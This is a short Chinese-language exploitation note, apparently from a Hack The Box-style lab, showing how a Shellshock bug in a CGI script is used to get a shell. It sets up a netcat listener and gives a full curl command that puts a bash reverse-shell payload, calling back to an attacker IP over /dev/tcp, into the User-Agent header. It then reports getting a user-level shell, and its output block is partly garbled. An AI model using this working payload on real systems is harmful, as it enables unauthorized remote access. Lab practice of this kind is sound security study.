# 漏洞利用

## Shellshock

根据文章内容，尝试一下反弹 shell

使用 nc 监听一个端口

```

nc -nvlp 4444
```

然后去利用

```
curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"
 http://10.10.10.56/cgi-bin/user.sh
```

```

┌──(root💀kali)-[~/Desktop]# nc -nvlp 4444                                                                                                                                                                                               1 ⨯

in

 this shell
```

成功得到一个 user 权限的 shell
